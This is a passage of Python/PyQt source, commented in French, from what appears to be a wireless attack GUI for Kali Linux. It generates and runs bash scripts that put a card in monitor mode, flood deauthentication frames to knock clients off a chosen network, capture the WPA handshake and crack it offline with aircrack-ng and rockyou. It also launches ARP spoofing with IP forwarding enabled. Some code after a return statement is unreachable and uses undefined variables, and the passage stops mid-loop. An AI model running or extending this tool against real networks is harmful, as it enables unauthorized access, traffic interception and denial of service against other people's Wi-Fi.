        w_top_lay.addWidget(verif_box)

        self._refresh_cap_list()

        # Statut global
        self.w_status = QLabel("Prêt — sélectionnez un réseau depuis le Scanner puis cliquez Lancer")
        self.w_status.setStyleSheet(f"color:#888; font-size:11px;")
        w_top_lay.addWidget(self.w_status)

        w_vsplit.addWidget(w_top)

        # ── Partie basse : 3 terminaux ──
        w_bot = QWidget()
        w_bot_lay = QVBoxLayout(w_bot)
        w_bot_lay.setContentsMargins(0, 0, 0, 0)

        self.w_splitter = QSplitter(Qt.Horizontal)
        self.w_splitter.setHandleWidth(5)
        self.w_splitter.setStyleSheet(
            f"QSplitter::handle:horizontal {{"
            f"  background: {COLORS['border']}; width: 5px; }}"
            f"QSplitter::handle:horizontal:hover {{"
            f"  background: {COLORS['accent']}; }}"
        )

        def make_term_box(title, color):
            box = QGroupBox(title)
            box.setStyleSheet(
                f"QGroupBox {{ border:1px solid {color}; border-radius:4px; "
                f"margin-top:10px; padding-top:6px; }}"
                f"QGroupBox::title {{ color:{color}; font-size:10px; "
                f"font-weight:bold; padding:0 6px; }}"
            )
            lay = QVBoxLayout(box)
            lay.setContentsMargins(4, 4, 4, 4)
            t = QTextEdit()
            t.setReadOnly(True)
            t.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
            t.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
            t.setStyleSheet(
                "background:#0d1117; color:#c9d1d9; "
                "font-family:Consolas,monospace; font-size:10px; "
                "border:none;"
            )
            lay.addWidget(t)
            return box, t

        box1, self.w_t1 = make_term_box("// TERMINAL 1 — CAPTURE HANDSHAKE",  COLORS['accent'])
        box2, self.w_t2 = make_term_box("// TERMINAL 2 — DEAUTH",             COLORS['danger'])
        box3, self.w_t3 = make_term_box("// TERMINAL 3 — CRACK DICTIONNAIRE", "#7c3aed")

        self.w_splitter.addWidget(box1)
        self.w_splitter.addWidget(box2)
        self.w_splitter.addWidget(box3)
        self.w_splitter.setSizes([400, 400, 400])

        w_bot_lay.addWidget(self.w_splitter)
        w_vsplit.addWidget(w_bot)

        # Taille initiale : config compact, terminaux = max espace
        w_vsplit.setSizes([220, 800])
        w_vsplit.setStretchFactor(0, 0)
        w_vsplit.setStretchFactor(1, 1)

        w_lay.addWidget(w_vsplit, stretch=1)

        self.stack.addWidget(wpa_w)

        # Stocker les threads des 3 terminaux
        self._wpa_threads = []

        # ── Page 3 : Attaque Dictionnaire ──
        dict_w = QWidget()
        di_lay = QVBoxLayout(dict_w)
        di_desc = QLabel(
            "Attaque par dictionnaire — crack offline du hash WPA\n"
            "Teste une liste de mots de passe contre un fichier .cap contenant le handshake.\n"
            "But : démontrer qu'un mot de passe simple est cassé en quelques secondes."
        )
        di_desc.setWordWrap(True)
        di_desc.setStyleSheet("color:#888; font-size:11px;")
        di_lay.addWidget(di_desc)

        di_cfg = QGroupBox("Paramètres")
        di_form = QFormLayout(di_cfg)

        # Champ fichier .cap + bouton de capture à droite
        cap_row = QWidget()
        cap_lay = QHBoxLayout(cap_row)
        cap_lay.setContentsMargins(0, 0, 0, 0)
        cap_lay.setSpacing(6)
        self.di_capfile = QLineEdit()
        self.di_capfile.setPlaceholderText("Cliquez 📡 pour capturer, ou entrez le chemin manuellement")
        # Chercher le cap le plus récent dans APP_DIR
        import glob as _g
        _caps = sorted(_g.glob(os.path.join(APP_DIR, "handshake_*.cap")), reverse=True)
        if _caps:
            self.di_capfile.setText(_caps[0])
        else:
            self.di_capfile.setText("")
        cap_lay.addWidget(self.di_capfile, stretch=1)
        self.btn_cap_auto = QPushButton("📡 Capturer maintenant")
        self.btn_cap_auto.setFixedHeight(32)
        self.btn_cap_auto.setStyleSheet(
            f"background:{COLORS['warning']}; color:#000; "
            f"border-radius:4px; font-weight:bold; padding:0 10px; font-size:11px;"
        )
        self.btn_cap_auto.clicked.connect(self._capture_for_dict)
        cap_lay.addWidget(self.btn_cap_auto)

        self.di_wordlist = QLineEdit(DEFAULT_WORDLIST)
        self.di_bssid    = QLineEdit("XX:XX:XX:XX:XX:XX")
        self.di_ssid     = QLineEdit("")
        di_form.addRow("Fichier .cap (handshake) :", cap_row)
        di_form.addRow("Wordlist :", self.di_wordlist)
        di_form.addRow("BSSID cible :", self.di_bssid)
        di_form.addRow("SSID (optionnel) :", self.di_ssid)
        di_lay.addWidget(di_cfg)

        # Aperçu commande
        self.di_cmd_preview = QLabel()
        self.di_cmd_preview.setStyleSheet(
            "background:#161b22; border:1px solid #30363d; border-radius:4px;"
            "padding:6px 10px; font-family:Consolas; color:#c9d1d9; font-size:11px;"
        )
        self.di_cmd_preview.setWordWrap(True)
        di_lay.addWidget(self.di_cmd_preview)

        # Info wordlists disponibles
        info = QLabel(
            "Wordlists disponibles sur Kali :  "
            "/usr/share/wordlists/rockyou.txt  |  "
            "/usr/share/wordlists/fasttrack.txt  |  "
            "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
        )
        info.setStyleSheet("color:#555; font-size:10px;")
        info.setWordWrap(True)
        di_lay.addWidget(info)

        self.di_terminal = QTextEdit(); self.di_terminal.setReadOnly(True)
        di_lay.addWidget(self.di_terminal, stretch=1)
        self.stack.addWidget(dict_w)

        # Connecter preview dictionnaire
        for w in [self.di_capfile, self.di_wordlist, self.di_bssid]:
            w.textChanged.connect(self._update_dict_preview)
        self._update_dict_preview()

        lay.addWidget(self.stack, stretch=1)

        # Update deauth preview on change
        for w in [self.d_iface, self.d_bssid, self.d_client]:
            w.textChanged.connect(self._update_deauth_preview)
        self.d_count.valueChanged.connect(self._update_deauth_preview)
        self._update_deauth_preview()

    def _capture_for_dict(self):
        """Bouton 📡 — capture rapide depuis la page Dictionnaire."""
        bssid = self.di_bssid.text().strip()
        iface = self.w_iface.text().strip()   # ex: wlan0mon
        chan  = self.w_channel.text().strip()

        if not bssid or bssid == "XX:XX:XX:XX:XX:XX":
            self.di_terminal.append(
                f"<span style='color:{COLORS['danger']};'>"
                f"⚠ Sélectionnez d'abord un réseau cible depuis le Scanner.</span>"
            )
            return

        # Déduire l'interface de base (wlan0 depuis wlan0mon)
        base_iface = iface.replace("mon", "") if iface.endswith("mon") else iface

        cap_prefix = os.path.join(APP_DIR, "handshake")

        # Script bash complet avec activation moniteur automatique
        script = (
            "BSSID='{bssid}'\n"
            "CHAN='{chan}'\n"
            "BASE='{base}'\n"
            "IFACE='{iface}'\n"
            "OUT='{prefix}_'$(date +%Y%m%d_%H%M%S)\n"
            "\n"
            "# Activer mode moniteur si pas actif\n"
            "if ! iw dev $IFACE info >/dev/null 2>&1; then\n"
            "  echo '⚙ Activation mode moniteur sur '$BASE'...'\n"
            "  sudo iw dev $BASE interface add mon0 type monitor 2>/dev/null\n"
            "  sudo ip link set mon0 up 2>/dev/null\n"
            "  IFACE=mon0\n"
            "  sleep 2\n"
            "fi\n"
            "\n"
            "echo '📡 Interface utilisée : '$IFACE\n"
            "echo '⏳ Démarrage capture → '$OUT'-01.cap'\n"
            "sudo airodump-ng -c $CHAN --bssid $BSSID -w $OUT --output-format cap $IFACE &\n"
            "DUMP_PID=$!\n"
            "sleep 5\n"
            "echo '💥 Envoi deauth (30 paquets) pour forcer reconnexion...'\n"
            "sudo aireplay-ng --deauth 30 -a $BSSID $IFACE\n"
            "sleep 8\n"
            "echo '💥 2ème vague deauth...'\n"
            "sudo aireplay-ng --deauth 20 -a $BSSID $IFACE\n"
            "sleep 5\n"
            "kill $DUMP_PID 2>/dev/null\n"
            "sleep 2\n"
            "CAPFILE=$(ls -t {prefix}_*-01.cap 2>/dev/null | head -1)\n"
            "if [ -n \"$CAPFILE\" ]; then\n"
            "  echo '✅ Fichier créé : '$CAPFILE\n"
            "  PKTS=$(aircrack-ng \"$CAPFILE\" 2>/dev/null | grep -c 'WPA')\n"
            "  if [ \"$PKTS\" -gt 0 ] 2>/dev/null; then\n"
            "    echo '✅ Handshake WPA détecté dans le fichier !'\n"
            "  else\n"
            "    echo '⚠ Fichier créé mais handshake WPA non confirmé'\n"
            "    echo '  Essayez : assurez-vous qu un client est connecté'\n"
            "  fi\n"
            "  echo '__CAPFILE__'$CAPFILE'__CAPFILE__'\n"
            "else\n"
            "  echo '❌ Aucun fichier .cap trouvé'\n"
            "  echo '   Vérifiez : interface moniteur active, BSSID correct, canal correct'\n"
            "fi\n"
        ).format(
            bssid=bssid,
            chan=chan,
            base=base_iface,
            iface=iface,
            prefix=cap_prefix,
        )

        self.btn_cap_auto.setEnabled(False)
        self.btn_cap_auto.setText("⏳ Capture...")
        self.di_terminal.clear()
        self.di_terminal.append(
            f"<span style='color:{COLORS['warning']};'>"
            f"⏳ Capture en cours — BSSID:{bssid}  Canal:{chan}  Interface:{iface}</span><br>"
        )

        cmd = f"bash -c '{script.replace(chr(39), chr(39)+chr(92)+chr(39)+chr(39))}'"
        # Plus propre : écrire le script dans un fichier temp
        script_path = "/tmp/_cap_dict.sh"
        with open(script_path, "w") as f:
            f.write("#!/bin/bash\n" + script)
        os.chmod(script_path, 0o755)

        self.thread = CmdThread(f"bash {script_path}")
        self.thread.output.connect(self._on_dict_cap_output)
        self.thread.finished.connect(lambda ok, m: (
            self.btn_cap_auto.setEnabled(True),
            self.btn_cap_auto.setText("📡 Capturer maintenant")
        ))
        self.thread.start()

    def _on_dict_cap_output(self, line):
        import re as _re
        m = _re.search(r'__CAPFILE__(.+?)__CAPFILE__', line)
        if m:
            cap_path = m.group(1).strip()
            if cap_path:
                self.cap_file = cap_path
                self.di_capfile.setText(cap_path)
                self.di_terminal.append(
                    f"<span style='color:{COLORS['success']};'>"
                    f"✅ Fichier créé et inséré : {cap_path}</span>"
                )
        else:
            self.di_terminal.append(line)

    def _refresh_cap_list(self):
        """Rafraîchit la liste des fichiers .cap disponibles dans APP_DIR."""
        import glob as _g
        caps = sorted(_g.glob(os.path.join(APP_DIR, "handshake_*-01.cap")), reverse=True)
        if not hasattr(self, 'w_cap_combo'):
            return
        current_data = self.w_cap_combo.currentData()
        self.w_cap_combo.blockSignals(True)
        self.w_cap_combo.clear()
        self.w_cap_combo.addItem("— Nouveau fichier (créé automatiquement) —", None)
        for cap in caps:
            fname = os.path.basename(cap)
            self.w_cap_combo.addItem(fname, cap)
        # Restaurer sélection
        if current_data:
            for i in range(self.w_cap_combo.count()):
                if self.w_cap_combo.itemData(i) == current_data:
                    self.w_cap_combo.setCurrentIndex(i)
                    break
        self.w_cap_combo.blockSignals(False)
        self.w_cap_combo.setToolTip(
            f"{len(caps)} fichier(s) .cap dans {APP_DIR}" if caps
            else f"Aucun fichier .cap dans {APP_DIR}"
        )

    def show_page(self, idx):
        self.stack.setCurrentIndex(idx)
        # Rafraîchir la liste .cap quand on arrive sur la page WPA
        if idx == 2:
            self._refresh_cap_list()

    def _update_deauth_preview(self):
        n = self.d_count.value()
        cnt = str(n) if n > 0 else "0 (continu)"
        self.d_cmd_preview.setText(
            f"sudo aireplay-ng --deauth {cnt} -a {self.d_bssid.text()} "
            f"-c {self.d_client.text()} {self.d_iface.text()}"
        )

    def _run_on_current(self, cmd):
        idx = self.stack.currentIndex()
        terms = [self.d_terminal, self.a_terminal, self.w_t1, self.di_terminal]
        terminal = terms[min(idx, len(terms)-1)]
        terminal.clear()
        self.thread = CmdThread(cmd)
        self.thread.output.connect(terminal.append)
        self.thread.start()

    def stop_attack(self):
        """Arrête le processus en cours + les 3 threads WPA si actifs."""
        if self.thread:
            self.thread.stop()
        self.stop_wpa()

    def lancer(self):
        idx = self.stack.currentIndex()
        if idx == 0:   self.launch_deauth()
        elif idx == 1: self.launch_arp()
        elif idx == 2: self.launch_handshake()
        elif idx == 3: self.launch_dict()

    def _update_dict_preview(self):
        cap = self.di_capfile.text().strip()
        wl  = self.di_wordlist.text().strip()
        b   = self.di_bssid.text().strip()
        if b and b != "XX:XX:XX:XX:XX:XX":
            cmd = f"sudo aircrack-ng -b {b} -w {wl} {cap}"
        else:
            cmd = f"sudo aircrack-ng -w {wl} {cap}"
        self.di_cmd_preview.setText(cmd)

    def launch_deauth(self):
        n = self.d_count.value()
        cmd = (f"sudo aireplay-ng --deauth {n} "
               f"-a {self.d_bssid.text()} -c {self.d_client.text()} "
               f"{self.d_iface.text()}")
        self._run_on_current(cmd)

    def launch_arp(self):
        iface  = self.a_iface.text().strip()
        target = self.a_target.text().strip()
        router = self.a_router.text().strip()
        cmd = (f"sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward && "
               f"arpspoof -i {iface} -t {target} {router}'")
        self._run_on_current(cmd)

    def launch_handshake(self):
        iface  = self.w_iface.text().strip()
        bssid  = self.w_bssid.text().strip()
        chan   = self.w_channel.text().strip()
        wl     = self.w_wordlist.text().strip()

        # Client MAC depuis le sélecteur
        client_mac = "FF:FF:FF:FF:FF:FF"
        if hasattr(self, 'w_client_combo') and self.w_client_combo.currentData():
            client_mac = self.w_client_combo.currentData()

        base_iface = iface.replace("mon", "") if iface.endswith("mon") else iface
        cap_prefix = os.path.join(APP_DIR, "handshake")
        ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
        cap_file = f"{cap_prefix}_{ts}"
        cap_01   = f"{cap_file}-01.cap"

        # Fichier .cap existant sélectionné → crack direct
        selected_cap = self.w_cap_combo.currentData() if hasattr(self, 'w_cap_combo') else None
        use_existing = selected_cap and os.path.exists(str(selected_cap))

        self.stop_wpa()
        self._wpa_threads = []
        for t in [self.w_t1, self.w_t2, self.w_t3]:
            t.clear()
        if hasattr(self, 'w_verif_result'):
            self.w_verif_result.clear()

        # ──────────────────────────────────────────────────
        # MODE CRACK DIRECT (fichier .cap existant choisi)
        # ──────────────────────────────────────────────────
        if use_existing:
            cap_01 = selected_cap
            ac = COLORS['accent']
            self.w_status.setText(f"⚔ Étapes 5+6 — crack sur {os.path.basename(cap_01)}")
            self.w_t1.append(
                f"<span style='color:{ac};'>"
                f"ℹ Fichier .cap sélectionné :<br>{cap_01}</span>"
            )
            self.w_t2.append(
                f"<span style='color:{ac};'>"
                f"┌─ ÉTAPE 5 : Vérification handshake<br>"
                f"│  sudo aircrack-ng {cap_01}</span><br>"
            )
            # Vérification
            self._verify_handshake(cap_01)

            # Crack
            script6 = (
                "#!/bin/bash\n"
                f"echo ''\n"
                f"echo '┌─ ÉTAPE 6 : Attaque dictionnaire'\n"
                f"echo '│  sudo aircrack-ng -w {wl} {cap_01}'\n"
                f"echo '└─────────────────────────────────'\n"
                f"echo ''\n"
                f"sudo aircrack-ng -b {bssid} -w {wl} {cap_01}\n"
                f"echo ''\n"
                f"echo '  ✅ Crack terminé'\n"
                f"echo ''\n"
                f"echo '┌─ ÉTAPE 7 : Désactivation mode moniteur'\n"
                f"echo '│  sudo airmon-ng stop {base_iface}mon'\n"
                f"echo '└─────────────────────────────────'\n"
                f"sudo airmon-ng stop {base_iface}mon 2>/dev/null\n"
                f"echo '  ✅ Mode moniteur désactivé'\n"
            )
            with open("/tmp/wpa_crack.sh", "w") as f: f.write(script6)
            os.chmod("/tmp/wpa_crack.sh", 0o755)
            t6 = CmdThread("bash /tmp/wpa_crack.sh")
            t6.output.connect(self.w_t3.append)
            t6.start()
            self._wpa_threads.append(t6)
            self.di_capfile.setText(cap_01)
            self.cap_file = cap_01
            return

        # ──────────────────────────────────────────────────
        # MODE COMPLET — 7 ÉTAPES
        # ──────────────────────────────────────────────────
        self.w_status.setText(
            f"⏳ 3 processus actifs — BSSID:{bssid}  Canal:{chan}  Client:{client_mac}"
        )

        # ══════════════════════════════════════════════════
        # TERMINAL 1 — Étapes 1 + 3 : Mode moniteur + Capture
        # ══════════════════════════════════════════════════
        script_t1 = (
            "#!/bin/bash\n"
            f"BASE='{base_iface}'\n"
            f"IFACE='{iface}'\n"
            f"BSSID='{bssid}'\n"
            f"CHAN='{chan}'\n"
            f"OUT='{cap_file}'\n"
            "\n"
            "echo ''\n"
            "echo '══════════════════════════════════════════'\n"
            "echo ' TERMINAL 1 — CAPTURE HANDSHAKE'\n"
            "echo '══════════════════════════════════════════'\n"
            "echo ''\n"
            "echo '┌─ ÉTAPE 1 : Mode moniteur'\n"
            f"echo '│  sudo airmon-ng start {base_iface}'\n"
            "echo '└──────────────────────────────────────'\n"
            "echo ''\n"
            # Étape 1 : activer mode moniteur
            "if iw dev $IFACE info >/dev/null 2>&1; then\n"
            "  echo '  ✅ Interface '$IFACE' déjà active'\n"
            "else\n"
            "  echo '  ⚙  Activation mode moniteur...'\n"
            "  sudo airmon-ng check kill 2>&1 | grep -v '^$' | head -5\n"
            "  sudo airmon-ng start $BASE 2>&1 | grep -E 'monitor|enabled|started'\n"
            "  sleep 2\n"
            "  if iw dev ${BASE}mon info >/dev/null 2>&1; then\n"
            "    IFACE=${BASE}mon\n"
            "    echo '  ✅ Interface moniteur créée : '$IFACE\n"
            "  else\n"
            "    sudo iw dev $BASE interface add mon0 type monitor 2>/dev/null\n"
            "    sudo ip link set mon0 up\n"
            "    IFACE=mon0\n"
            "    echo '  ✅ Interface moniteur créée : '$IFACE\n"
            "  fi\n"
            "fi\n"
            "echo ''\n"
            "echo '┌─ ÉTAPE 3 : Capture handshake'\n"
            f"echo '│  sudo airodump-ng -c {chan} --bssid {bssid} -w {cap_file} $IFACE'\n"
            "echo '└──────────────────────────────────────'\n"
            "echo ''\n"
            "echo '  BSSID  : '$BSSID\n"
            "echo '  Canal  : '$CHAN\n"
            "echo '  Sortie : '$OUT'-01.cap'\n"
            "echo ''\n"
            "echo '  ⏳ Capture — attendez : [WPA handshake: '$BSSID']'\n"
            "echo ''\n"
            "sudo airodump-ng -c $CHAN --bssid $BSSID -w $OUT --output-format cap $IFACE\n"
            "echo ''\n"
            "echo '  ✅ Capture terminée → '$OUT'-01.cap'\n"
        )

        # ══════════════════════════════════════════════════
        # TERMINAL 2 — Étapes 4 + 5 : Deauth + Vérification (boucle)
        # ══════════════════════════════════════════════════
        script_t2 = (
            "#!/bin/bash\n"
            f"BSSID='{bssid}'\n"
            f"CLIENT='{client_mac}'\n"
            f"IFACE='{iface}'\n"
            f"CAP='{cap_01}'\n"
            f"PREFIX='{cap_prefix}'\n"
            "\n"
            "echo ''\n"
            "echo '══════════════════════════════════════════'\n"
            "echo ' TERMINAL 2 — DEAUTH + VÉRIFICATION'\n"
            "echo '══════════════════════════════════════════'\n"
            "echo ''\n"
            "echo '  ⏳ Attente 5s que la capture démarre...'\n"
            "sleep 5\n"
            "if ! iw dev $IFACE info >/dev/null 2>&1; then\n"
            f"  if iw dev {base_iface}mon info >/dev/null 2>&1; then\n"
            f"    IFACE={base_iface}mon\n"
            "  else IFACE=mon0; fi\n"
            "fi\n"
            "echo ''\n"
            "echo '┌─ ÉTAPE 4 : Déconnexion clients (force handshake)'\n"
            "echo '│  sudo aireplay-ng -0 15 -a '$BSSID' -c '$CLIENT' '$IFACE\n"
            "echo '└──────────────────────────────────────'\n"
            "echo ''\n"
            "echo '  BSSID réseau : '$BSSID\n"
            "echo '  Client MAC   : '$CLIENT' (FF:FF = tous)'\n"
            "echo '  Interface    : '$IFACE\n"
            "echo ''\n"
            "echo '  💥 Envoi 15 paquets deauth — clients forcés à se reconnecter'\n"
            "sudo aireplay-ng -0 15 -a $BSSID -c $CLIENT $IFACE\n"
            "echo ''\n"
            "echo '  💥 2ème vague deauth (20 paquets)...'\n"
            "sudo aireplay-ng -0 20 -a $BSSID -c $CLIENT $IFACE\n"
            "echo ''\n"
            "echo '  ✅ Deauth terminé'\n"
            "echo ''\n"
            # Boucle étape 5 : vérifier handshake, retry si 0
            "RETRY=0\n"
            "MAX_RETRY=5\n"
            "while [ $RETRY -lt $MAX_RETRY ]; do\n"
            "  echo '┌─ ÉTAPE 5 : Vérification handshake (tentative '$((RETRY+1))')'\n"
            "  echo '│  sudo aircrack-ng '$CAP\n"
            "  echo '└──────────────────────────────────────'\n"
            "  echo ''\n"
            "  sleep 3\n"
            "  CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
            "  [ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
            "  echo '  Fichier : '$CAPFILE\n"
            "  if [ ! -f \"$CAPFILE\" ]; then\n"
            "    echo '  ⏳ Fichier pas encore créé...'\n"
            "    sleep 5; RETRY=$((RETRY+1)); continue\n"
            "  fi\n"
            "  echo ''\n"
            "  RESULT=$(sudo aircrack-ng \"$CAPFILE\" 2>&1)\n"
            "  echo \"$RESULT\" | grep -E '#|BSSID|WPA|WEP|handshake|ESSID' | head -8\n"
            "  echo ''\n"
            "  HS=$(echo \"$RESULT\" | grep -c 'WPA (1 handshake)\\|WPA (2 handshake)\\|WPA ([1-9]')\n"
            "  if [ \"$HS\" -gt 0 ]; then\n"
            "    echo '  ✅ HANDSHAKE WPA CAPTURÉ ! → Crack lancé dans Terminal 3'\n"
            "    echo '__VERIF__'\"$(echo \"$RESULT\" | grep -E 'WPA|BSSID|ESSID' | head -5)\"'__VERIF__'\n"
            "    break\n"
            "  else\n"
            "    echo '  ⚠  WPA (0 handshake) — Relance deauth...'\n"
            "    echo '__VERIF_FAIL__'\n"
            "    sudo aireplay-ng -0 20 -a $BSSID -c $CLIENT $IFACE\n"
            "    RETRY=$((RETRY+1))\n"
            "  fi\n"
            "done\n"
            "if [ $RETRY -ge $MAX_RETRY ]; then\n"
            "  echo '  ❌ Handshake non capturé après $MAX_RETRY tentatives'\n"
            "  echo '  → Vérifiez : client connecté ? canal correct ? interface OK ?'\n"
            "fi\n"
        )

        # ══════════════════════════════════════════════════
        # TERMINAL 3 — Étapes 6 + 7 : Crack + Stop moniteur
        # ══════════════════════════════════════════════════
        script_t3 = (
            "#!/bin/bash\n"
            f"BSSID='{bssid}'\n"
            f"CAP='{cap_01}'\n"
            f"WL='{wl}'\n"
            f"PREFIX='{cap_prefix}'\n"
            f"BASE='{base_iface}'\n"
            "\n"
            "echo ''\n"
            "echo '══════════════════════════════════════════'\n"
            "echo ' TERMINAL 3 — CRACK DICTIONNAIRE'\n"
            "echo '══════════════════════════════════════════'\n"
            "echo ''\n"
            "echo '  BSSID   : '$BSSID\n"
            "echo '  Wordlist: '$WL\n"
            "echo ''\n"
            "echo '  ⏳ Attente que le handshake soit capturé (25s)...'\n"
            "sleep 25\n"
            "echo ''\n"
            # Chercher le fichier le plus récent
            "CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
            "[ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
            "echo '  🗃  Fichier utilisé : '$CAPFILE\n"
            "echo ''\n"
            # Attendre si fichier absent
            "if [ ! -f \"$CAPFILE\" ]; then\n"
            "  echo '  ⏳ Fichier absent, attente 20s...'\n"
            "  sleep 20\n"
            "  CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
            "  [ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
            "fi\n"
            "echo '┌─ ÉTAPE 6 : Attaque dictionnaire'\n"
            f"echo '│  sudo aircrack-ng -w {wl} '$CAPFILE\n"
            "echo '└──────────────────────────────────────'\n"
            "echo ''\n"
            "sudo aircrack-ng -b $BSSID -w $WL \"$CAPFILE\"\n"
            "echo ''\n"
            "echo '┌─ ÉTAPE 7 : Désactivation mode moniteur'\n"
            f"echo '│  sudo airmon-ng stop {base_iface}mon'\n"
            "echo '└──────────────────────────────────────'\n"
            "echo ''\n"
            f"sudo airmon-ng stop {base_iface}mon 2>/dev/null\n"
            "sudo airmon-ng stop mon0 2>/dev/null\n"
            "echo '  ✅ Mode moniteur désactivé — wlan0 restauré'\n"
        )

        # Écrire et lancer les 3 scripts
        scripts = [
            ("/tmp/wpa_t1.sh", script_t1, self.w_t1),
            ("/tmp/wpa_t2.sh", script_t2, self.w_t2),
            ("/tmp/wpa_t3.sh", script_t3, self.w_t3),
        ]
        for path, content, _ in scripts:
            with open(path, "w") as f: f.write(content)
            os.chmod(path, 0o755)

        for path, _, terminal in scripts:
            t = CmdThread(f"bash {path}")
            t.output.connect(
                lambda line, term=terminal: self._wpa_line(line, term)
            )
            t.start()
            self._wpa_threads.append(t)

        self.di_capfile.setText(cap_01)
        self.cap_file = cap_01

    def _wpa_line(self, line, terminal):
        import re as _re
        # Marqueur succès vérification
        m = _re.search(r'__VERIF__(.*)__VERIF__', line)
        if m:
            verif = m.group(1).strip()
            if hasattr(self, 'w_verif_result') and verif:
                self.w_verif_result.setPlainText(verif)
                self.w_verif_result.setStyleSheet(
                    "background:#0d1117; color:#3fb950; "
                    "font-family:Consolas,monospace; font-size:11px; border:none;"
                )
            return
        # Marqueur échec vérification
        if '__VERIF_FAIL__' in line:
            if hasattr(self, 'w_verif_result'):
                self.w_verif_result.setPlainText(
                    "⚠ WPA (0 handshake) — Deauth relancé, tentative suivante..."
                )
                self.w_verif_result.setStyleSheet(
                    "background:#0d1117; color:#f59e0b; "
                    "font-family:Consolas,monospace; font-size:11px; border:none;"
                )
            return
        terminal.append(line)

    def _verify_handshake(self, cap_path):
        """Vérifie le handshake d'un .cap existant et affiche dans la boîte."""
        def _run_verify():
            try:
                r = subprocess.run(
                    f"sudo aircrack-ng '{cap_path}' 2>&1",
                    shell=True, capture_output=True, text=True
                )
                out = r.stdout + r.stderr
                lines = [l for l in out.splitlines()
                         if any(k in l for k in ['WPA', 'WEP', 'BSSID', 'handshake', '#'])]
                result = "\n".join(lines[:8]) if lines else "⚠ Aucun handshake détecté"
                if hasattr(self, 'w_verif_result'):
                    self.w_verif_result.setPlainText(result)
            except Exception as e:
                if hasattr(self, 'w_verif_result'):
                    self.w_verif_result.setPlainText(f"Erreur : {e}")

        import threading
        threading.Thread(target=_run_verify, daemon=True).start()

    def _build_crack_script(self, bssid, cap_01, wl):
        return (
            "#!/bin/bash\n"
            f"echo '=== CRACK DIRECT — FICHIER EXISTANT ==='\n"
            f"echo 'BSSID   : {bssid}'\n"
            f"echo 'Fichier : {cap_01}'\n"
            f"echo 'Wordlist: {wl}'\n"
            "echo ''\n"
            f"echo '⚔ Attaque dictionnaire...'\n"
            "echo ''\n"
            f"sudo aircrack-ng -b {bssid} -w {wl} '{cap_01}'\n"
            "echo ''\n"
            "echo '✅ Crack terminé'\n"
        )

        # ── Script 1 : Activer moniteur + capture ──
        script_cap = (
            "#!/bin/bash\n"
            f"BSSID='{bssid}'\nCHAN='{chan}'\nBASE='{base_iface}'\n"
            f"IFACE='{iface}'\nOUT='{cap_file}'\n\n"
            "echo '=== CAPTURE HANDSHAKE ==='\n"
            "echo 'BSSID  : '$BSSID\n"
            "echo 'Canal  : '$CHAN\n"
            "echo 'Fichier: '$OUT'-01.cap'\n"
            "echo ''\n"
            "if ! iw dev $IFACE info >/dev/null 2>&1; then\n"
            "  echo '⚙ Activation moniteur sur '$BASE'...'\n"
            "  sudo iw dev $BASE interface add mon0 type monitor 2>/dev/null\n"
            "  sudo ip link set mon0 up 2>/dev/null\n"
            "  IFACE=mon0\n"
            "  sleep 2\n"
            "fi\n"
            "echo '📡 Interface : '$IFACE\n"
            "echo '⏳ Capture — attendez [WPA handshake: ...]'\n"
            "echo ''\n"
            "sudo airodump-ng -c $CHAN --bssid $BSSID -w $OUT --output-format cap $IFACE\n"
            "echo ''\n"
            "echo '✅ Capture terminée'\n"
        )

        # ── Script 2 : Deauth continu ──
        script_deauth = (
            "#!/bin/bash\n"
            f"BSSID='{bssid}'\nIFACE='{iface}'\n\n"
            "echo '=== DEAUTH — FORCE RECONNEXION ==='\n"
            "echo 'BSSID : '$BSSID\n"
            "echo ''\n"
            "echo '⏳ Attente 5s que la capture démarre...'\n"
            "sleep 5\n"
            "if ! iw dev $IFACE info >/dev/null 2>&1; then IFACE=mon0; fi\n"
            "echo '💥 Envoi paquets deauth (0=continu) sur '$IFACE'...'\n"
            "echo '   Les clients vont se déconnecter et reconnecter'\n"
            "echo '   → Le handshake sera capturé dans le Terminal 1'\n"
            "echo ''\n"
            "sudo aireplay-ng --deauth 0 -a $BSSID $IFACE\n"
        )

        # ── Script 3 : Crack avec aircrack-ng ──
        script_crack = (
            "#!/bin/bash\n"
            f"BSSID='{bssid}'\nCAP='{cap_01}'\n"
            f"WL='{wl}'\nPREFIX='{cap_prefix}'\n\n"
            "echo '=== CRACK WPA2 DICTIONNAIRE ==='\n"
            "echo 'BSSID   : '$BSSID\n"
            "echo 'Wordlist: '$WL\n"
            "echo ''\n"
            "echo '⏳ Attente 20s que le handshake soit capturé...'\n"
            "sleep 20\n"
            "echo ''\n"
            "CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
            "[ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
            "echo '🗃 Fichier : '$CAPFILE\n"
            "echo ''\n"
            "if [ ! -f \"$CAPFILE\" ]; then\n"
            "  echo '⏳ Fichier absent, nouvelle attente 15s...'\n"
            "  sleep 15\n"
            "  CAPFILE=$(ls -t $PREFIX_*-01.cap 2>/dev/null | head -1)\n"
            "  [ -z \"$CAPFILE\" ] && CAPFILE=\"$CAP\"\n"
            "fi\n"
            "echo '⚔ Attaque dictionnaire...'\n"
            "echo ''\n"
            "sudo aircrack-ng -b $BSSID -w $WL \"$CAPFILE\"\n"
            "echo ''\n"
            "echo '✅ Crack terminé'\n"
        )

        # Écrire les scripts
        scripts = [
            ("/tmp/wpa_cap.sh",   script_cap),
            ("/tmp/wpa_deauth.sh", script_deauth),
            ("/tmp/wpa_crack.sh",  script_crack),
        ]
        for path, content in scripts:
            with open(path, "w") as f: f.write(content)
            os.chmod(path, 0o755)

        # Lancer les 3 CmdThread sur les 3 terminaux internes
        terminals = [self.w_t1, self.w_t2, self.w_t3]
        for i, (path, _) in enumerate(scripts):
            t = CmdThread(f"bash {path}")
            t.output.connect(terminals[i].append)
